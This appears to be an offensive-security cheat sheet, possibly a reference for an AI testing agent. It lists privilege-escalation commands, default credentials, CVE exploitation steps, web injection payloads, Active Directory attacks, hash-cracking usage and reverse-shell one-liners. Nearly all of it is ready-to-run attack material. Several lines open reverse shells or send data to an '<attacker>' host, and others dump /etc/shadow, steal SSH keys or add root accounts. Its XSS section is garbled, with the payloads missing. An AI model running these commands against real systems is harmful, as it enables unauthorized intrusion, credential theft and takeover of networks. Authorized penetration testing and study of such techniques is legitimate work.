GTFOBins: bash with SUID bit
Condition: find / -perm -4000 -name bash 2>/dev/null returns a result
Command: bash -p
Result: Effective UID becomes root. -p disables automatic privilege dropping.
Also works with: /bin/sh -p if sh has SUID

GTFOBins: python3 with SUID bit
Condition: find / -perm -4000 -name python* 2>/dev/null returns a result
Command: python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
Also works for python2: python -c 'import os; os.setuid(0); os.system("/bin/bash")'
Result: Root shell

GTFOBins: perl with SUID bit
Condition: find / -perm -4000 -name perl 2>/dev/null
Command: perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'
Result: Root shell

GTFOBins: ruby with SUID bit
Condition: find / -perm -4000 -name ruby 2>/dev/null
Command: ruby -e 'Process::Sys.setuid(0); exec "/bin/bash"'
Result: Root shell

GTFOBins: find with SUID bit
Condition: find / -perm -4000 -name find 2>/dev/null
Command: find . -exec /bin/bash -p \; -quit
Result: Root shell via -exec flag

GTFOBins: vim with SUID bit
Condition: find / -perm -4000 -name vim 2>/dev/null
Command: vim -c ':py3 import os; os.setuid(0); os.execl("/bin/bash","bash","-p")'
Alternative: vim -c ':!/bin/bash -p'
Result: Root shell or root file read

GTFOBins: nmap with SUID bit (old nmap with --interactive)
Condition: find / -perm -4000 -name nmap 2>/dev/null; nmap version < 5.21
Command: nmap --interactive
Then at nmap> prompt: !sh
Result: Root shell. Newer nmap does not have --interactive.

GTFOBins: awk with SUID bit
Condition: find / -perm -4000 -name awk 2>/dev/null
Command: awk 'BEGIN {system("/bin/bash -p")}'
Result: Root shell

GTFOBins: env with SUID bit
Condition: find / -perm -4000 -name env 2>/dev/null
Command: env /bin/bash -p
Result: Root shell

GTFOBins: less / more with SUID bit
Condition: find / -perm -4000 \( -name less -o -name more \) 2>/dev/null
Command: less /etc/passwd
Then at the less prompt type: !/bin/bash -p
Result: Root shell via shell escape

GTFOBins: tee with SUID bit (file write)
Condition: find / -perm -4000 -name tee 2>/dev/null
Use for arbitrary file write as root:
  echo 'root2:x:0:0::/root:/bin/bash' | tee -a /etc/passwd
  echo 'user ALL=(ALL) NOPASSWD:ALL' | tee -a /etc/sudoers
Result: Write arbitrary files as root; add new root user or sudo entry

GTFOBins: cp with SUID bit (file copy as root)
Condition: find / -perm -4000 -name cp 2>/dev/null
Read /etc/shadow: cp /etc/shadow /tmp/shadow && cat /tmp/shadow
Overwrite /etc/passwd: cp /tmp/mypasswd /etc/passwd
Result: Arbitrary file read/write as root

GTFOBins: cat with SUID bit (file read)
Condition: find / -perm -4000 -name cat 2>/dev/null
Command: cat /etc/shadow
cat /root/root.txt  (flag read)
cat /root/.ssh/id_rsa  (key exfil)
Result: Arbitrary file read as root

GTFOBins: nano with SUID bit
Condition: find / -perm -4000 -name nano 2>/dev/null
Read shadow: nano /etc/shadow
Add root user: nano /etc/passwd → append: evil:x:0:0::/root:/bin/bash
Shell escape: Ctrl+R then Ctrl+X → enter command
Result: File read/write or command execution as root

Linux capabilities escalation
Detection: getcap -r / 2>/dev/null
Dangerous capabilities:
  cap_setuid+ep on python3: python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
  cap_setuid+ep on perl: perl -e 'use POSIX; POSIX::setuid(0); exec "/bin/bash"'
  cap_net_raw: can sniff network traffic
  cap_dac_override: bypass file permissions
  cap_sys_admin: mount filesystems, can lead to container escape

GTFOBins: bash via sudo
Condition: sudo -l shows (root) NOPASSWD: /bin/bash
Command: sudo bash
Result: Root shell

GTFOBins: python3 via sudo
Condition: sudo -l shows (root) NOPASSWD: /usr/bin/python3
Command: sudo python3 -c 'import pty; pty.spawn("/bin/bash")'
Result: Root shell

GTFOBins: find via sudo
Condition: sudo -l shows (root) NOPASSWD: /usr/bin/find
Command: sudo find / -exec /bin/bash \; -quit
Result: Root shell via exec

GTFOBins: vim via sudo
Condition: sudo -l shows (root) NOPASSWD: /usr/bin/vim
Command: sudo vim -c ':!/bin/bash'
Alternative: sudo vim /etc/sudoers (edit directly)
Result: Root shell

GTFOBins: less via sudo
Condition: sudo -l shows (root) NOPASSWD: /usr/bin/less
Command: sudo less /etc/passwd
At prompt type: !/bin/bash
Result: Root shell via shell escape

GTFOBins: awk via sudo
Condition: sudo -l shows (root) NOPASSWD: /usr/bin/awk
Command: sudo awk 'BEGIN {system("/bin/bash")}'
Result: Root shell

GTFOBins: nmap via sudo
Condition: sudo -l shows (root) NOPASSWD: /usr/bin/nmap
Old nmap (<5.21): sudo nmap --interactive → !sh
New nmap: echo 'os.execute("/bin/bash")' > /tmp/nmap.nse && sudo nmap --script /tmp/nmap.nse
Result: Root shell

GTFOBins: tee via sudo (file write)
Condition: sudo -l shows (root) NOPASSWD: /usr/bin/tee
Add to sudoers: echo 'currentuser ALL=(ALL) NOPASSWD:ALL' | sudo tee -a /etc/sudoers
Then: sudo bash
Result: Full sudo without password

GTFOBins: perl via sudo
Condition: sudo -l shows (root) NOPASSWD: /usr/bin/perl
Command: sudo perl -e 'exec "/bin/bash"'
Result: Root shell

sudo env LD_PRELOAD privilege escalation
Condition: sudo -l shows env_keep+=LD_PRELOAD AND any sudo command allowed
Steps:
  1. Create /tmp/pe.c:
     #include<stdio.h>\n#include<unistd.h>\nvoid _init(){setuid(0);setgid(0);system("/bin/bash");}
  2. gcc -fPIC -shared -nostartfiles -o /tmp/pe.so /tmp/pe.c
  3. sudo LD_PRELOAD=/tmp/pe.so <any_allowed_command>
Result: Root shell via shared library injection

Default credentials: FTP
Always try anonymous FTP first:
  ftp <host>  →  username: anonymous  →  password: anything@email.com
Common defaults: admin:admin, admin:password, ftp:ftp, root:root
Check for anonymous with: nmap -sV --script ftp-anon -p 21 <host>
List files: ls -la; get files: get <filename>

Default credentials: SSH
Common defaults: root:root, root:toor, admin:admin, pi:raspberry (Raspberry Pi)
ubuntu:ubuntu (AWS Ubuntu AMIs), vagrant:vagrant (Vagrant VMs)
Brute force (requires approval): hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://<host>
Key-based: check /home/*/.ssh/authorized_keys for hints on valid users
Also check /etc/ssh/sshd_config for PermitRootLogin and PasswordAuthentication

Default credentials: PostgreSQL
Common defaults: postgres:postgres, postgres: (blank)
Connect: psql -h <host> -U postgres
List databases: \l
Execute OS commands (if superuser): COPY cmd_exec FROM PROGRAM 'id'; SELECT * FROM cmd_exec;
Read file: COPY /etc/passwd TO STDOUT;
Nmap: nmap --script pgsql-brute -p 5432 <host>

Default credentials: MongoDB
Often runs unauthenticated on port 27017
Connect: mongosh <host>:27017  or  mongo <host>:27017
List DBs: show dbs
Dump collection: use <db>; db.users.find()
Check for credentials in collections — often stores plaintext passwords

Default credentials: SNMP
Common community strings: public, private, community, manager
Enumerate (v1/v2c): snmpwalk -v2c -c public <host>
Enumerate users: snmpwalk -v1 -c public <host> 1.3.6.1.4.1.77.1.2.25
Enumerate network: snmpwalk -v1 -c public <host> 1.3.6.1.2.1.4.34
Brute community strings: onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt <host>

Default credentials: SMB / Windows
Try null sessions: smbclient -N -L //<host>/
Guest access: smbclient -U guest -N //<host>/
Common defaults: Administrator: (blank), admin:admin, guest: (blank)
Enumerate shares: crackmapexec smb <host> -u '' -p ''
Check for guest: crackmapexec smb <host> -u 'guest' -p ''

Default credentials: Common web admin panels
WordPress: admin:admin, admin:password — login at /wp-admin
Drupal: admin:admin — login at /user/login
Joomla: admin:admin — login at /administrator
Tomcat: admin:admin, tomcat:tomcat, manager:manager — at /manager/html
Jenkins: admin:admin, admin: (blank) — at /login
Grafana: admin:admin — at /login
phpMyAdmin: root: (blank), root:root — at /phpmyadmin
Webmin: admin:admin — at port 10000

CVE: vsftpd 2.3.4 backdoor
Affected: vsftpd 2.3.4 on port 21
Detection: nmap -sV on port 21 shows 'vsftpd 2.3.4'
How it works: Logging in with a username containing ':)' triggers a backdoor shell on port 6200
Exploit:
  nc <host> 21  →  USER ":)"  →  PASS anything  →  nc <host> 6200
Metasploit: use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS <host>; run
Result: Root shell on port 6200

CVE: MS17-010 EternalBlue (SMBv1 RCE)
Affected: Windows 7, Server 2008, unpatched Windows 10 — SMBv1 on port 445
Detection: nmap --script smb-vuln-ms17-010 -p 445 <host>
Metasploit:
  use exploit/windows/smb/ms17_010_eternalblue
  set RHOSTS <host>; set LHOST <attacker>; set PAYLOAD windows/x64/meterpreter/reverse_tcp
  run
Result: SYSTEM shell. No credentials needed.
Note: Often detected by AV — try ms17_010_psexec module as alternative

CVE: CVE-2021-4034 PwnKit (polkit pkexec LPE)
Affected: All Linux distros with polkit < 0.120 (before Jan 2022 patches)
Detection: pkexec --version; dpkg -l policykit-1 (check version)
Exploit:
  git clone https://github.com/ly4k/PwnKit; cd PwnKit; make; ./PwnKit
  OR: curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit -o PwnKit; chmod +x PwnKit; ./PwnKit
Result: Instant root shell on vulnerable systems
Note: Widely patched — check kernel/package versions first

CVE: CVE-2014-6271 Shellshock (bash RCE)
Affected: bash < 4.3 patch 25 — CGI scripts, DHCP clients, SSH ForceCommand
Test: curl -H 'User-Agent: () { :; }; echo Content-Type: text/html; echo; /usr/bin/id' http://<host>/cgi-bin/test.cgi
Exploit headers to try: User-Agent, Referer, Cookie, X-Forwarded-For
Metasploit: use exploit/multi/http/apache_mod_cgi_bash_env_exec
Reverse shell payload: () { :; }; /bin/bash -i >& /dev/tcp/<attacker>/<port> 0>&1

CVE: CVE-2021-44228 Log4Shell (Log4j RCE)
Affected: Apache Log4j 2.0-beta9 to 2.14.1 (Java applications)
Detection: Any Java app accepting user input logged via Log4j
Payload: ${jndi:ldap://<attacker>:389/a}
Inject in: URL parameters, headers (User-Agent, X-Forwarded-For, Authorization), form fields
Test: ${jndi:ldap://<your_burp_collaborator>/test} — check for DNS callback
Tool: java -jar JNDI-Exploit-Kit.jar (setup LDAP server + payload)
Result: RCE as the user running the Java application

CVE: CVE-2021-3156 Baron Samedit (sudo heap overflow LPE)
Affected: sudo < 1.9.5p2 — check with: sudoedit -s /
If vulnerable: prints 'usage: sudoedit' (not a syntax error)
Exploit: https://github.com/blasty/CVE-2021-3156
  git clone https://github.com/blasty/CVE-2021-3156; cd CVE-2021-3156; make
  ./sudo-hax-me-a-sandwich 0  (try different targets: 0, 1, 2)
Result: Root shell without knowing any password

CVE: CVE-2016-5195 Dirty COW (kernel race condition LPE)
Affected: Linux kernel < 4.8.3 (many older systems, containers)
Detection: uname -r — if < 4.8.3, potentially vulnerable
Exploit variants:
  dirtyc0w.c — overwrites /proc/self/mem to patch /etc/passwd
  cowroot.c — creates SUID root shell
Download: https://github.com/dirtycow/dirtycow.github.io/blob/master/dirtyc0w.c
Compile: gcc -pthread dirtyc0w.c -o dirtyc0w -lcrypt
Result: Local privilege escalation to root

CVE: CVE-2014-0160 OpenSSL Heartbleed (memory disclosure)
Affected: OpenSSL 1.0.1 through 1.0.1f
Detection: nmap --script ssl-heartbleed -p 443 <host>
Manual test: python heartbleed.py <host> 443
Metasploit: use auxiliary/scanner/ssl/openssl_heartbleed; set RHOSTS <host>; run
Leaks: session tokens, private keys, passwords, user data from server memory
Result: Information disclosure — may reveal credentials or session tokens

CVE: CVE-2015-3306 ProFTPd mod_copy (unauthenticated file copy)
Affected: ProFTPd 1.3.5 with mod_copy enabled
Detection: nmap -sV port 21 shows 'ProFTPD 1.3.5'
Exploit: SITE CPFR and SITE CPTO commands work without authentication
  nc <host> 21
  SITE CPFR /etc/passwd
  SITE CPTO /var/www/html/passwd.txt
  curl http://<host>/passwd.txt
Write webshell: SITE CPFR /proc/self/cmdline; SITE CPTO /var/www/html/shell.php
Metasploit: use exploit/unix/ftp/proftpd_modcopy_exec

CVE: CVE-2021-1675 PrintNightmare (Windows Print Spooler RCE/LPE)
Affected: Windows with Print Spooler service (default ON)
Detection: rpcdump.py @<host> | findstr 'MS-RPRN'
Remote exploit (LPE → SYSTEM):
  python3 CVE-2021-1675.py <domain>/<user>:<pass>@<host> '\\<attacker>\share\shell.dll'
Local exploit: SpoolFool or PrintNightmare.exe
Metasploit: use exploit/windows/dcerpc/cve_2021_1675_printnightmare
Result: SYSTEM or local privilege escalation

SQL Injection: authentication bypass payloads
Basic: ' OR '1'='1  /  ' OR 1=1 --  /  ' OR 'x'='x
Comment styles: --  /*  #  (use # for MySQL)
Always-true: 1'OR'1'='1  /  admin'--  /  ' OR 1=1#
Union-based test: ' UNION SELECT 1,2,3--
Error-based (MySQL): ' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--
Time-based blind (MySQL): ' AND SLEEP(5)--
Time-based blind (MSSQL): '; WAITFOR DELAY '0:0:5'--
Use sqlmap for automation: sqlmap -u '<url>' --forms --dbs (requires approval)

Local File Inclusion (LFI): common paths to try
Linux files: /etc/passwd  /etc/shadow  /etc/hosts  /proc/self/environ
              /var/log/apache2/access.log  /var/log/auth.log
Path traversal: ../../../etc/passwd  /....//....//etc/passwd
PHP wrappers: php://filter/convert.base64-encode/resource=index.php
              php://input (for RCE via POST)
              data://text/plain;base64,<base64_payload>
Null byte bypass (PHP < 5.3): ../../../../etc/passwd%00
Log poisoning: poison User-Agent in access.log, then include log file

File upload bypass techniques
Change extension: .php → .php5, .phtml, .pHp, .php.jpg
Magic bytes: add GIF89a; to start of PHP file, name it shell.php.gif
Content-Type bypass: change MIME type to image/jpeg in Burp while keeping .php extension
Null byte: shell.php%00.jpg
Double extension: shell.jpg.php
htaccess trick: upload .htaccess with 'AddType application/x-httpd-php .jpg'
EXIF injection: embed PHP in EXIF comment field, upload as real .jpg
After upload: check /uploads/, /files/, /images/ for the shell

Cross-Site Scripting (XSS): basic test payloads Basic: Attribute injection: " onmouseover="alert(1) JS event: SVG: Cookie steal: DOM XSS: look for location.hash, document.write, innerHTML in JS source Tool: dalfox url '' (requires approval)

OS Command Injection: test payloads
Separator chars: ;  &&  ||  |  `  $(...)
Basic test: ; id  && id  | id  `id`  $(id)
Blind (time-based): ; sleep 5
Out-of-band: ; curl http://<attacker>:8080/$(id)
Reverse shell: ; bash -c 'bash -i >& /dev/tcp/<attacker>/<port> 0>&1'
URL encoded: %3B+id  %26%26+id
Look for: ping, host lookup, DNS queries, file conversion, report generation fields

Server-Side Request Forgery (SSRF): test payloads
Target internal services: http://127.0.0.1/<path>  http://localhost/
Cloud metadata: http://169.254.169.254/latest/meta-data/ (AWS)
               http://169.254.169.254/computeMetadata/v1/ (GCP, add header)
               http://169.254.169.254/metadata/instance (Azure)
Bypass filters: http://0.0.0.0/  http://2130706433/ (decimal 127.0.0.1)
               http://127.1/  http://[::1]/  http://spoofed.domain@127.0.0.1/
Protocol escalation: dict://  gopher://  file:///etc/passwd
Internal port scan: test http://127.0.0.1:<port>/ for each port

Insecure Direct Object Reference (IDOR) and broken access control
Test: change numeric IDs in URLs, API calls, form params: ?id=1 → ?id=2
Try: other user IDs, negative IDs, zero, GUIDs from other responses
Horizontal escalation: access another user's data with same privilege
Vertical escalation: access admin endpoints as regular user
Test admin endpoints: /admin, /api/admin/, /management, /console
Role bypass: change role in JWT, cookie, request param, or hidden form field
HTTP method bypass: try GET vs POST vs PUT vs DELETE on restricted endpoints
Header bypass: X-Original-URL: /admin  X-Rewrite-URL: /admin  X-Custom-IP-Authorization: 127.0.0.1

Directory traversal and content discovery
Common wordlists in container:
  /usr/share/seclists/Discovery/Web-Content/common.txt
  /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
  /usr/share/wordlists/dirb/common.txt
ffuf: ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://<host>/FUZZ
feroxbuster: feroxbuster -u http://<host>/ -w <wordlist> --depth 2
gobuster: gobuster dir -u http://<host>/ -w <wordlist> -x php,html,txt
API endpoints: /api/v1/, /api/v2/, /swagger.json, /api-docs, /.well-known/
Backup files: .bak, .old, .orig, ~, .swp

Active Directory: AS-REP Roasting
Condition: User has 'Do not require Kerberos preauthentication' enabled (UF_DONT_REQUIRE_PREAUTH)
No credentials needed — only usernames
Enumerate vulnerable users:
  GetNPUsers.py <domain>/ -usersfile users.txt -no-pass -dc-ip <dc_ip> -format hashcat
With credentials:
  GetNPUsers.py <domain>/<user>:<pass> -request -dc-ip <dc_ip> -format hashcat
Crack offline:
  hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt
Result: Domain user credentials if hash cracks

Active Directory: Kerberoasting
Condition: Any valid domain user + service account with SPN set
Request TGS tickets:
  GetUserSPNs.py <domain>/<user>:<pass> -dc-ip <dc_ip> -request -outputfile spn_hashes.txt
Crack offline:
  hashcat -m 13100 spn_hashes.txt /usr/share/wordlists/rockyou.txt
Enumerate SPNs only (no ticket):
  GetUserSPNs.py <domain>/<user>:<pass> -dc-ip <dc_ip>
Result: Service account credentials if hash cracks
Note: Service accounts often have high privileges (Domain Admin) and weak passwords

Active Directory: Pass-the-Hash
Condition: Have an NTLM hash (from secretsdump, mimikatz, etc.)
WMI exec: wmiexec.py <domain>/<user>@<host> -hashes :<ntlm_hash>
PSExec: psexec.py <domain>/<user>@<host> -hashes :<ntlm_hash>
SMB: smbclient.py <domain>/<user>@<host> -hashes :<ntlm_hash>
CrackMapExec: crackmapexec smb <host> -u <user> -H <ntlm_hash>
Evil-WinRM: evil-winrm -i <host> -u <user> -H <ntlm_hash>
Note: Works with NT hash only (second half of NTLM: aad3b...:ntlm_here)

Active Directory: DCSync attack
Condition: Account has Replicating Directory Changes + Replicating Directory Changes All rights
           (or is in Domain Admins / Enterprise Admins)
Dump all hashes:
  secretsdump.py <domain>/<user>:<pass>@<dc_ip>
Dump specific account:
  secretsdump.py <domain>/<user>:<pass>@<dc_ip> -just-dc-user Administrator
Dump krbtgt (for Golden Ticket):
  secretsdump.py <domain>/<user>:<pass>@<dc_ip> -just-dc-user krbtgt
Result: All domain NTLM hashes → full domain compromise

Active Directory: BloodHound enumeration
Collect data:
  bloodhound-python -c All -d <domain> -u <user> -p <pass> -ns <dc_ip> -o /work/ad/bloodhound/
Key BloodHound queries:
  'Shortest Paths to Domain Admin' — shows full attack chain
  'Find Principals with DCSync Rights'
  'Find AS-REP Roastable Users'
  'Find Kerberoastable Users with most privileges'
  'Computers with Unsupported Operating Systems'
CLI queries (without Neo4j):
  grep -r 'AdminTo' /work/ad/bloodhound/*.json
Result: Visual attack path from any user to Domain Admin

Active Directory: ACL/ACE abuse
Dangerous ACEs to look for in BloodHound:
  GenericAll: full control over object → reset password, add to group
  GenericWrite: modify attributes → set SPN (Kerberoast), add member
  WriteOwner: become object owner → then set ACL
  WriteDACL: modify ACL → grant yourself DCSync rights
  ForceChangePassword: reset password without knowing current one
Exploit ForceChangePassword:
  net rpc password <target_user> <new_pass> -U <domain>/<user>%<pass> -S <dc_ip>
Exploit GenericAll on group (add member):
  net rpc group addmem <group> <user> -U <domain>/<user>%<pass> -S <dc_ip>

Active Directory: LLMNR/NBT-NS Poisoning
Condition: LLMNR or NBT-NS enabled (default on Windows until recently)
How it works: Respond to broadcast name resolution requests → capture NTLMv2 hashes
Tool: Responder (listen on the network interface)
  responder -I eth0 -rdwv
Captured hashes saved to /usr/share/responder/logs/
Crack: hashcat -m 5600 ntlmv2_hashes.txt /usr/share/wordlists/rockyou.txt
Or relay (don't crack): use ntlmrelayx.py to relay to SMB on targets without signing
  ntlmrelayx.py -tf targets.txt -smb2support
Note: Requires being on the same network segment as victims

Active Directory: Initial enumeration without credentials
Enumerate domain users (no creds needed if LDAP null bind works):
  ldapsearch -x -H ldap://<dc_ip> -b 'dc=<domain>,dc=<tld>' '(objectClass=user)' sAMAccountName
Enumerate with kerbrute (username enumeration):
  kerbrute userenum -d <domain> --dc <dc_ip> /usr/share/seclists/Usernames/top-usernames-shortlist.txt
Enumerate shares:
  smbclient -L //<dc_ip>/ -N
  crackmapexec smb <dc_ip> --shares -u '' -p ''
Check for web interface: http://<dc_ip>/certsrv (ADCS), https://<dc_ip>/OWA (Exchange)

Hash cracking: hashcat mode reference
NTLM: -m 1000
NTLMv1: -m 3000
NTLMv2 (Net-NTLMv2, captured by Responder): -m 5600
MD5: -m 0
SHA1: -m 100
SHA256: -m 1400
bcrypt ($2*$): -m 3200
MD5crypt ($1$, Unix): -m 500
SHA512crypt ($6$, Unix/shadow): -m 1800
SHA256crypt ($5$, Unix/shadow): -m 7400
Kerberos TGS (Kerberoast): -m 13100
Kerberos AS-REP (AS-REP Roast): -m 18200
WPA/WPA2: -m 22000
Common usage: hashcat -m <mode> <hashfile> /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

Hash cracking: john the ripper formats and usage
Auto-detect format: john <hashfile>
Specify format: john --format=NT <hashfile>  (for NTLM)
Common formats: --format=nt (NTLM), --format=md5crypt, --format=bcrypt,
                --format=sha512crypt, --format=krb5tgs (Kerberoast)
With wordlist: john <hashfile> --wordlist=/usr/share/wordlists/rockyou.txt
With rules: john <hashfile> --wordlist=rockyou.txt --rules
Show cracked: john --show <hashfile>
Shadow file: john /etc/shadow --wordlist=/usr/share/wordlists/rockyou.txt
SSH key: ssh2john id_rsa > id_rsa.hash; john id_rsa.hash --wordlist=rockyou.txt
ZIP: zip2john archive.zip > zip.hash; john zip.hash

Hash identification: format recognition
32 hex chars: MD5 ($1$) or NTLM
40 hex chars: SHA1
64 hex chars: SHA256
128 hex chars: SHA512
$1$: MD5crypt (Unix)
$2a$, $2b$, $2y$: bcrypt
$5$: SHA256crypt (Unix)
$6$: SHA512crypt (Unix shadow)
aad3b435b51404eeaad3b435b51404ee: empty NTLM (LM hash for blank)
$krb5tgs$23$: Kerberoasted TGS (RC4)
$krb5asrep$23$: AS-REP hash (RC4)
Tool: hashid <hash>  or  hash-identifier

Reverse shell one-liners (start listener: nc -lvnp <port>)
Bash: bash -i >& /dev/tcp/<attacker>/<port> 0>&1
Bash (alt): 0<&196;exec 196<>/dev/tcp/<attacker>/<port>; sh <&196 >&196 2>&196
